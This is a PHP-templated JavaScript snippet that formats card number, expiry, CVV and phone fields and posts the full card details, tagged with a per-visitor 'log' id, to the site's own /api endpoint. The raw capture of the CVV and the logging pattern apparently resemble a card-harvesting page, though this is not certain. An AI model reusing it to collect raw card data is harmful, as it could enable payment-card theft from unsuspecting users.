    <script>
        function DataChecker(form) {
            form.querySelectorAll('input').forEach(input => {
                switch (input.name) {
                    case 'SRDataPhone':
                        input.addEventListener('input', () => {
                            let value = input.value;
                            let numericValue = value.replace(/[^\d\s]/g, '');
                            let formattedValue = numericValue !== '' ? '+' + numericValue : '';

                            const cursorPosition = input.selectionStart;
                            const cursorDiff = formattedValue.length - value.length; // Разница в длине строки

                            input.value = formattedValue;
                            input.selectionStart = input.selectionEnd = cursorPosition + cursorDiff; // Коррекция позиции курсора
                        });
                        break;
                    case 'SRDataCardNumber':
                        input.addEventListener('input', () => {
                            let value = input.value;
                            let numericValue = value.replace(/\D/g, '');
                            let formattedValue = numericValue.substring(0, 19).replace(/(\d{4}(?=\d))/g, '$1 ');

                            const cursorPosition = input.selectionStart;
                            const cursorDiff = formattedValue.length - value.length;

                            input.value = formattedValue;
                            input.selectionStart = input.selectionEnd = cursorPosition + cursorDiff;
                        });
                        break;
                    case 'SRDataExpirationDate':
                        input.addEventListener('input', () => {
                            let value = input.value;
                            let numericValue = value.replace(/\D/g, '');
                            let formattedValue = '';

                            if (numericValue.length >= 1) {
                                formattedValue += numericValue.substring(0, 2);
                                if (numericValue[0] > 1) {
                                    formattedValue = '0' + numericValue.substring(0, 2);
                                }
                            }

                            if (numericValue.length >= 3) {
                                formattedValue += '/' + numericValue.substring(2, 6);
                            }

                            const cursorPosition = input.selectionStart;
                            const cursorDiff = formattedValue.length - value.length;

                            input.value = formattedValue;
                            input.selectionStart = input.selectionEnd = cursorPosition + cursorDiff;
                        });
                        break;
                    case 'SRDataCVV':
                        input.addEventListener('input', () => {
                            let value = input.value;
                            let numericValue = value.replace(/\D/g, '');
                            let formattedValue = numericValue.substring(0, 4);
                            input.value = formattedValue;
                        });
                        break;
                    case 'SRDataFullName':
                        // console.log(1);
                        break;
                }
            });
            form.addEventListener('submit', (e) => {
                e.preventDefault();
                document.querySelector('.lds-ellipsis_wrap').classList.remove('disabled');
                let formData = $('.SRDataForm').serializeArray();
                let cardData = {};
                formData.forEach((field) => {
                    cardData[field.name] = field.value;
                });
                cardData.log = <?= $log['id']?>;
                cardData.type = '<?= $action ?>';
                console.log(cardData)
                form.remove();
                $.ajax({
                    url: '/api',
                    method: 'post',
                    dataType: 'json',
                    data: {
                        SRcardData: cardData
                    },
                    success: function(data) {
                        console.log(data)

                    }
                });
            });

        }

        $(document).ready(function() {
            DataChecker(document.querySelector('.SRDataForm'));


        })
    </script>
